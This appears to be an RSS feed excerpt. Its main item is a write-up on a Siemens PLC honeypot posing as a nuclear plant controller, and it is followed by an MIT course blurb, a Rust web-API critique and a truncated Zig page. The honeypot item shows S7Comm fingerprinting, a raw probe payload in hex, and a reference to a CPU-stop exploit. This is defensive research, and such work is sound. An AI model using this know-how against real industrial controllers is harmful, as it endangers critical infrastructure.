&lt;p id=&quot;42f7&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;Siemens PLCs use SZL for showing other machines what type of PLC it is. SZL stands for &lt;strong class=&quot;hp cv&quot;&gt;S&lt;/strong&gt;ystem&lt;strong class=&quot;hp cv&quot;&gt;Z&lt;/strong&gt;ustands&lt;strong class=&quot;hp cv&quot;&gt;L&lt;/strong&gt;iste and is German for system information list. Internet scanners make use of this by making two requests. A module ID request and component ID request. The response is then decoded by the (internet) scanners and used for indexing. See results from Censys and Shodan below.&lt;/p&gt;

(old) test setup with two Siemens S7 1200 PLCs

Setting up communications to the PLC
&lt;p id=&quot;4723&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;First, a TCP connection is set up using the 3-way handshake. After that a COTP connection request (CR) is sent to the machine. If accepted, the PLC will return a COTP Connection Confirmed response. The client system will now send a S7Comm job request to setup a connection on the Siemens s7 protocol called s7comm.&lt;/p&gt;
&lt;p id=&quot;80ba&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;Now that everything is in place, the client can start retrieving information about the PLC by doing multiple requests.&lt;/p&gt;

Retrieving SLZ information using Nmap
&lt;p id=&quot;ea1d&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;The image above shows the interaction that the honeypot needs to setup to be fingerprinted as a Siemens PLC. It needs to react to 3 Read SZL requests. These have SZL ID 0x11 and 0x1c (module ID and component ID requests).&lt;/p&gt;

&lt;p id=&quot;22e7&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;Next to implementing SZL it’s also interesting to fake exploit execution to deceive a malicious actor in thinking they can damage the system.&lt;/p&gt;
&lt;p id=&quot;ef7c&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;One method used to disable de machines is using a CPU stop command. This is also part of the S7Comm protocol and will disable the unit. After implementing the right response, my honeypot would fake being disabled.&lt;/p&gt;
&lt;p id=&quot;be26&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;And voilà, ICSSploit shows the exploit ran successfully.&lt;/p&gt;
&lt;p id=&quot;3d68&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;For al the &lt;strong class=&quot;hp cv&quot;&gt;Nmap&lt;/strong&gt; users: result of a network scan on the honeypot crafted to simulate industrial PLCs below.&lt;/p&gt;
&lt;pre class=&quot;ip iq ir is it ln lo lp&quot;&gt;
&lt;span id=&quot;6e83&quot; class=&quot;gn lq jm fr lr b dj ls lt s lu&quot;&gt;PORT    STATE SERVICE&lt;br/&gt;102/tcp open  iso-tsap&lt;br/&gt;| s7-info:&lt;br/&gt;|   Module: 6ES7 518-4AP00-0AB0&lt;br/&gt;|   Basic Hardware: 6ES7 518-4AP00-0AB0&lt;br/&gt;|   Version: 2.6.0&lt;br/&gt;|   System Name: INTERN_VALVE_REG_O1&lt;br/&gt;|   Serial Number: S C-N5820302&lt;br/&gt;|   Plant Identification: NUCL_POWER_GEN_05&lt;br/&gt;|_  Copyright: Original Siemens Equipment&lt;br/&gt;Service Info: Device: specialized&lt;/span&gt;&lt;span id=&quot;fa9c&quot; class=&quot;gn lq jm fr lr b dj lv lw lx ly lz lt s lu&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds&lt;/span&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;8a3e&quot; class=&quot;lq jm fr av jn ma mb mc jq md me mf jt mg mh mi jx mj mk ml kb mm mn mo kf mp gn&quot;&gt;Probe example&lt;/h2&gt;
&lt;p id=&quot;06ee&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;This is what the Nmap probes look like from the Honeypot’s side of view.&lt;/p&gt;
&lt;pre class=&quot;ip iq ir is it ln lo lp&quot;&gt;
&lt;span id=&quot;9b1f&quot; class=&quot;gn lq jm fr lr b dj ls lt s lu&quot;&gt;{&lt;br/&gt;“category”: “s7comm”,&lt;br/&gt;“date”: “2020–12–08T21:23:32.541508039+01:00”,&lt;br/&gt;“destination-ip”: “x.x.x.x”,&lt;br/&gt;“destination-port”: 102,&lt;br/&gt;“payload-hex”:     “0300002102f080320700000000000800080001120411440100ff09000400110001,&lt;br/&gt;“payload-length”: 33,&lt;br/&gt;“request.ID”: “17”,&lt;br/&gt;“request.type”: “module ID request”,&lt;br/&gt;“sensor”: “services”,&lt;br/&gt;“source-ip”: “x.x.x.x”,&lt;br/&gt;“source-port”: 53662,&lt;br/&gt;“token”: “bssglu3k2l04oeabnus0”,&lt;br/&gt;“type”: “ics”&lt;br/&gt;}&lt;/span&gt;
&lt;/pre&gt;

&lt;p id=&quot;0b0d&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;After initial setup I waited for the system to be indexed by scanning services such as &lt;a href=&quot;https://www.shodan.io/&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Shodan&lt;/a&gt; and &lt;a href=&quot;https://censys.io/&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Censys&lt;/a&gt;. These are search engines for actual machines instead of webpages. Setting aside the differences, the goal is the same: to be recorded in online search engines for all of the internet to find. Preferably as an actual nuclear reactor instead of a honeypot.&lt;/p&gt;
&lt;p id=&quot;8f42&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;First system to connect was an internet scanner in Romania. The machine resolved to turtle.census.shodan.io which meant the Shodan.io scanners started to index the valve regulator from the fake nuclear reactor! This resulted in the following record on their site:&lt;/p&gt;

&lt;p id=&quot;118f&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;It also seemed to fool the Honeypot detector created by Shodan when the honeypot ran at lesser known hosting providers.&lt;/p&gt;

&lt;p id=&quot;6ad6&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;Censys also had no problem indexing the HoneyPot as a real industrial machine.&lt;/p&gt;


&lt;p id=&quot;0d27&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;Most traffic received in the month of operation originated from the United States. This was expected, as most internet scanners are hosted there. Especially Censys using their ZGrab2 scanners is quite active, but ipip.net wins with an average count of two scans a day.&lt;/p&gt;

Top 10 hosts connecting to the honeypot
&lt;p id=&quot;69ca&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;When looking at the data a bit more in-depth, it becomes apparent that most requests received by the honeypot are not recognised. This can have two reasons. First, this specific honeypot implementation is a rather specific. It’s best used as a decoy in an internal network. This is because of its low interaction and the fact that S7commPlus is not implemented yet. And secondly, not all traffic sent to the honeypot was traffic destined for the device itself. Someone even tried sending RDP packets to the machine.&lt;/p&gt;

Total amount of requests received by category
&lt;p id=&quot;f02c&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;(Un)fortunately no-one tried to actively harm the PLC by trying to send CPU stop commands like (&lt;a href=&quot;https://www.exploit-db.com/exploits/19833&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;https://www.exploit-db.com/exploits/19833&lt;/a&gt;) to the machine.&lt;/p&gt;
&lt;p id=&quot;ecdd&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;When filtering out all regular big internet scanners I was left with a list of small scanners and people genuinely interested in the simulator.&lt;/p&gt;

&lt;p id=&quot;467d&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;The first domain that stands out is security.criminalip.com, this is a somewhat smaller global internet scanning project, so not targeting the honeypot in particular.&lt;/p&gt;
&lt;p id=&quot;0b4d&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;The top results is coming from telenet.be, which is an internet provider for consumers in Belgium. This is interesting as it’s targeted traffic. When looking at the requests it becomes clear that this system tried to connect to our honeypot, using the s7commPlus protocol.&lt;/p&gt;
&lt;p id=&quot;f3cd&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;Next is traffic coming from a system at a Swedish hosting company. It’s a system from F-Secure for global indexing.&lt;/p&gt;
&lt;p id=&quot;226c&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;The fourth system is from ovo.cs. It claims to be a global collective of service providers and provided services and that its members share knowledge, resources, and support with the aim of building sustainable, independent online businesses.&lt;/p&gt;
&lt;p id=&quot;6861&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;Lastly, we have a system pointing to cron.optisan.com.tw, which is a weird one. The domain didn’t resolve, but optisan.com.tw gets redirected to www.optisanoptics.eu a store that sells weaponry. It seems they’ve sent multiple GET requests to the honeypot on port 102/tcp which is not part of the s7comm protocol. Interesting, to say the least.&lt;/p&gt;

&lt;p id=&quot;2ff8&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;There is active scanning for industrial equipment on the internet. Not only by big companies that index the whole IPv4 space, but also by individuals and organisations interested in which machines are available. Luckily most traffic received is from researchers scanning the whole IPv4 space for systems in the vein of responsible disclosure. However, this does not exclude that there are real people looking for industrial machines on the internet as well.&lt;/p&gt;


&lt;p id=&quot;c5e0&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;&lt;strong class=&quot;hp cv&quot;&gt;Q:&lt;/strong&gt; Tools used? &lt;strong class=&quot;hp cv&quot;&gt;A:&lt;/strong&gt; Wireshark, Nmap, Zgrab2, ICSSploit, MetaSploit.&lt;/p&gt;
&lt;p id=&quot;56e6&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;&lt;strong class=&quot;hp cv&quot;&gt;Q:&lt;/strong&gt; Aware of the Purdue model for ICS security? &lt;strong class=&quot;hp cv&quot;&gt;A:&lt;/strong&gt; Yes, but setting up level 3, 4 and 5 would’ve made this small project way too big.&lt;/p&gt;
&lt;p id=&quot;0b5b&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;&lt;strong class=&quot;hp cv&quot;&gt;Q&lt;/strong&gt;: Did you run just one? &lt;strong class=&quot;hp cv&quot;&gt;A:&lt;/strong&gt; Yes, for this project at least. This simulator has also been part of bigger global deployment at as part of a project at &lt;a href=&quot;https://dtact.com&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;DTACT&lt;/a&gt;&lt;/p&gt;
&lt;p id=&quot;3d4b&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;&lt;strong class=&quot;hp cv&quot;&gt;Q&lt;/strong&gt;: Difficult to create the simulator? &lt;strong class=&quot;hp cv&quot;&gt;A:&lt;/strong&gt; Implementing? No, HoneyTrap is very well suited for such projects. Protocol research? Quite. The protocol knows multiple iterations and implementations…&lt;/p&gt;

&lt;em class=&quot;nf&quot;&gt;ISO — OSI classification&lt;/em&gt;
&lt;p id=&quot;b1b8&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;&lt;strong class=&quot;hp cv&quot;&gt;Q:&lt;/strong&gt; Why not use Conpot? &lt;strong class=&quot;hp cv&quot;&gt;A:&lt;/strong&gt; I wanted a simulation with a bit more interaction, a bit of s7commPlus support and have the ability to fake system exploits. Also, Conpot has become easily detectable as it uses some static values in its component ID response.&lt;/p&gt;
</description>
<pubDate>Sat, 16 Jan 2021 10:39:02 +0000</pubDate>
<dc:creator>tutfbhuf</dc:creator>
<og:type>article</og:type>
<og:title>Running a fake power plant on the internet for a month</og:title>
<og:description>There is a lot more on the internet than just social media and banking websites…</og:description>
<og:url>https://grimminck.medium.com/running-a-fake-power-plant-on-the-internet-for-a-month-4a624f685aaa</og:url>
<og:image>https://miro.medium.com/max/1024/1*fe1jmBrEL0AsXcJNfcuNlg.jpeg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://grimminck.medium.com/running-a-fake-power-plant-on-the-internet-for-a-month-4a624f685aaa</dc:identifier>
</item>
<item>
<title>Computer System Engineering</title>
<link>https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-033-computer-system-engineering-spring-2018/</link>
<guid isPermaLink="true" >https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-033-computer-system-engineering-spring-2018/</guid>
<description>&lt;p class=&quot;help-dismiss&quot;&gt;&lt;a href=&quot;javascript:disableHelpPopup();%20trackEvents('Popup%20Don%5C't%20Show','popup%20don%5C't%20show%20Click','Help%20Overlay');&quot;&gt;Don't show me this again&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Welcome!&lt;/h2&gt;
&lt;p&gt;This is one of over 2,400 courses on OCW. Explore materials for this course in the pages linked along the left.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MIT OpenCourseWare&lt;/strong&gt; is a free &amp;amp; open publication of material from thousands of MIT courses, covering the entire MIT curriculum.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;No enrollment or registration.&lt;/strong&gt; Freely browse and use OCW materials at your own pace. There's no signup, and no start or end dates.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Knowledge is your reward.&lt;/strong&gt; Use OCW to guide your own life-long learning, or to teach others. We don't offer credit or certification for using OCW.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Made for sharing&lt;/strong&gt;. Download files for later. Send to friends and colleagues. Modify, remix, and reuse (just remember to cite OCW as the source.)&lt;/p&gt;
&lt;p class=&quot;help-engage&quot;&gt;Learn more at &lt;a href=&quot;https://ocw.mit.edu/help/get-started-with-ocw/&quot; onclick=&quot;trackEvents('Popup Get Started','popup get started Click','Help Overlay');&quot;&gt;Get Started with MIT OpenCourseWare&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 16 Jan 2021 08:03:03 +0000</pubDate>
<dc:creator>hackitup7</dc:creator>
<og:title>Computer System Engineering</og:title>
<og:url>https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-033-computer-system-engineering-spring-2018/</og:url>
<og:image>https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-033-computer-system-engineering-spring-2018/6-033s18.png</og:image>
<og:description>This class covers topics on the engineering of computer software and hardware systems. Topics include techniques for controlling complexity; strong modularity using client-server design, operating systems; performance, networks; naming; security and privacy; fault-tolerant systems, atomicity and coordination of concurrent activities, and recovery; impact of computer systems on society.</og:description>
<og:type>website</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-033-computer-system-engineering-spring-2018/</dc:identifier>
</item>
<item>
<title>Rust is a hard way to make a web API</title>
<link>https://macwright.com/2021/01/15/rust.html</link>
<guid isPermaLink="true" >https://macwright.com/2021/01/15/rust.html</guid>
<description>&lt;p&gt;Rust is an amazing language. It has enabled excellent CLI tools like &lt;a href=&quot;https://github.com/BurntSushi/ripgrep&quot;&gt;ripgrep&lt;/a&gt; and &lt;a href=&quot;https://github.com/ogham/exa&quot;&gt;exa&lt;/a&gt;. Companies like Cloudflare are using Rust for their own systems and &lt;a href=&quot;https://blog.cloudflare.com/tag/rust/&quot;&gt;encouraging people to write Rust to run microservices&lt;/a&gt;. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.&lt;/p&gt;
&lt;p&gt;If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.&lt;/p&gt;
&lt;p&gt;But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.&lt;/p&gt;
&lt;h3 id=&quot;lots-of-missing-pieces&quot;&gt;Lots of missing pieces&lt;/h3&gt;
&lt;p&gt;Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only &lt;em&gt;very&lt;/em&gt; low-level parts. Where Node.js will give you &lt;a href=&quot;http://www.passportjs.org/&quot;&gt;passport&lt;/a&gt; and Rails has &lt;a href=&quot;https://github.com/heartcombo/devise&quot;&gt;devise&lt;/a&gt; and Django gives you an &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication&quot;&gt;auth model out of the box&lt;/a&gt;, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like &lt;a href=&quot;https://github.com/breard-r/libreauth&quot;&gt;libreauth&lt;/a&gt;, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.&lt;/p&gt;
&lt;p&gt;How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The &lt;a href=&quot;https://aws.amazon.com/sdk-for-javascript/&quot;&gt;aws-sdk-js&lt;/a&gt; and &lt;a href=&quot;https://stripe.com/docs/libraries&quot;&gt;Stripe libraries&lt;/a&gt;, for example, are incredibly well-designed and maintained.&lt;/p&gt;
&lt;p&gt;Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?&lt;/p&gt;
&lt;p&gt;Some people will say &lt;em&gt;well, X language is so good you can just write an SDK yourself in a weekend!&lt;/em&gt; To which I must reply, no.&lt;/p&gt;
&lt;p&gt;Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.&lt;/p&gt;
&lt;h3 id=&quot;rusts-compiler-is-faster-than-it-was-but-still-slow&quot;&gt;Rust’s compiler is faster than it was, but still slow&lt;/h3&gt;
&lt;p&gt;I’ve been reading &lt;a href=&quot;https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/&quot;&gt;Nicholas Nethercote’s&lt;/a&gt; &lt;em&gt;excellent&lt;/em&gt; blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!&lt;/p&gt;
&lt;p&gt;But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.&lt;/p&gt;
&lt;p&gt;Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of &lt;a href=&quot;https://cloud.google.com/cloud-build&quot;&gt;Google Code Build&lt;/a&gt;, it would run out of time, every time. We couldn’t build anything.&lt;/p&gt;
&lt;p&gt;Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe &lt;a href=&quot;https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html&quot;&gt;slimming down dependencies&lt;/a&gt; would help Rust projects compile faster. But &lt;a href=&quot;https://serde.rs/&quot;&gt;serde&lt;/a&gt;, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.&lt;/p&gt;
&lt;h3 id=&quot;rust-is-complicated&quot;&gt;Rust is complicated&lt;/h3&gt;
&lt;p&gt;Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.&lt;/p&gt;
&lt;p&gt;These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.&lt;/p&gt;
&lt;p&gt;Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both &lt;em&gt;safe&lt;/em&gt; and &lt;em&gt;low-level&lt;/em&gt; - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.&lt;/p&gt;
&lt;p&gt;But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.&lt;/p&gt;
&lt;details&gt;Sidenote…This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The &lt;a href=&quot;https://github.com/nodejs/node/issues/4660&quot;&gt;previous behavior of Node.js's Buffer object, for example, is a good read.&lt;/a&gt;&lt;/details&gt;&lt;p&gt;Heck, if you ask &lt;a href=&quot;https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/&quot;&gt;some people&lt;/a&gt;, Rust is &lt;em&gt;less secure&lt;/em&gt; than a GC’ed language for web apps if you use any crates that have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsafe&lt;/code&gt; code - which includes Actix, the most popular web framework, because &lt;a href=&quot;https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html&quot;&gt;unsafe code allows things like deferencing raw pointers&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.&lt;/p&gt;
&lt;p&gt;This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are &lt;em&gt;amazing&lt;/em&gt; if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like &lt;a href=&quot;https://tokio.rs/&quot;&gt;tokio&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.&lt;/p&gt;
&lt;p&gt;Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.&lt;/p&gt;
&lt;h3 id=&quot;the-rust-ecosystem-is-not-web-centric&quot;&gt;The Rust ecosystem is not web-centric&lt;/h3&gt;
&lt;p&gt;There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.&lt;/p&gt;
&lt;p&gt;This is an important part of the equation for technology choices: are there people working with the tool &lt;em&gt;and&lt;/em&gt; are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a &lt;a href=&quot;https://github.com/iron/iron&quot;&gt;somewhat higher-level framework&lt;/a&gt; - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a &lt;a href=&quot;https://github.com/actix/actix-web/graphs/contributors&quot;&gt;very top-heavy set of contributors&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.&lt;/p&gt;
&lt;h3 id=&quot;the-juniper-crate-invites-n1s&quot;&gt;The Juniper crate invites n+1s&lt;/h3&gt;
&lt;p&gt;This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.infoq.com/articles/N-Plus-1/&quot;&gt;The &lt;strong&gt;n+1&lt;/strong&gt; problem&lt;/a&gt; is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp;amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.id IN ids&lt;/code&gt; to fetch all authors in a single pass and then reconnect them to their photos.&lt;/p&gt;
&lt;p&gt;n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has &lt;a href=&quot;https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations&quot;&gt;quick ways to turn n+1 queries into predictable queries&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We were using &lt;a href=&quot;https://github.com/graphql-rust/juniper&quot;&gt;Juniper&lt;/a&gt;, a &lt;a href=&quot;https://graphql.org/&quot;&gt;GraphQL&lt;/a&gt; server for Rust applications. GraphQL basically lets your &lt;em&gt;frontend application&lt;/em&gt; define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.&lt;/p&gt;
&lt;p&gt;This makes things &lt;em&gt;hard&lt;/em&gt; for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - &lt;a href=&quot;https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html&quot;&gt;a dataloader&lt;/a&gt; - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.&lt;/p&gt;
&lt;p&gt;The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, &lt;a href=&quot;https://info.crunchydata.com/blog/postgres-the-batteries-included-database&quot;&gt;for good reason&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;lets-have-some-caveats&quot;&gt;Let’s have some caveats!&lt;/h3&gt;
&lt;p&gt;So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.&lt;/p&gt;
&lt;p&gt;The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was &lt;a href=&quot;https://github.com/OkCupid/okws&quot;&gt;implemented in C++&lt;/a&gt;. There’s a popular &lt;a href=&quot;https://www.costarastrology.com/&quot;&gt;astrology app, Co-star&lt;/a&gt;, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.&lt;/p&gt;
&lt;p&gt;Another caveat: what I was trying to build was a &lt;a href=&quot;https://en.wikipedia.org/wiki/Create,_read,_update_and_delete&quot;&gt;CRUD&lt;/a&gt;-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that did one operation very fast and millions of times, but a web “application” - something that did quite a few different operations and had a fair bit of domain logic in it. If you’re &lt;em&gt;not&lt;/em&gt; building that kind of thing, this advice might not apply! If what you need is to do one or two things at hyper-fast speed, like if you’re writing a payment gateway or voice messaging application, Rust’s tradeoffs might work a lot better.&lt;/p&gt;
&lt;p&gt;Here’s another caveat: I’m writing this in January 2021. Assuming that society continues to function, Rust will evolve and will probably get a lot better, and it may become really easy to use for web application development.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;All said, I really enjoyed working with Rust. It’s a beautiful language with a lot of cool ideas, and I hope that soon I’ll be thinking about something I want to build and Rust will be the right tool. As it is now, though, a lot of the things I want to build are better served by languages that have different priorities.&lt;/p&gt;
</description>
<pubDate>Fri, 15 Jan 2021 23:25:11 +0000</pubDate>
<dc:creator>tmcw</dc:creator>
<og:type>blog</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://macwright.com/2021/01/15/rust.html</dc:identifier>
</item>
<item>
<title>Why Zig when there is already C++, D, and Rust?</title>
<link>https://ziglang.org/learn/why_zig_rust_d_cpp/</link>
<guid isPermaLink="true" >https://ziglang.org/learn/why_zig_rust_d_cpp/</guid>
<description>&lt;nav id=&quot;TableOfContents&quot;/&gt;&lt;h2 id=&quot;no-hidden-control-flow&quot;&gt;No hidden control flow&lt;/h2&gt;
&lt;p&gt;If Zig code doesn’t look like it’s jumping away to call a function, then it isn’t. This means you can be sure that the following code calls only &lt;code&gt;foo()&lt;/code&gt; and then &lt;code&gt;bar()&lt;/code&gt;, and this is guaranteed without needing to know the types of anything:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre&gt;
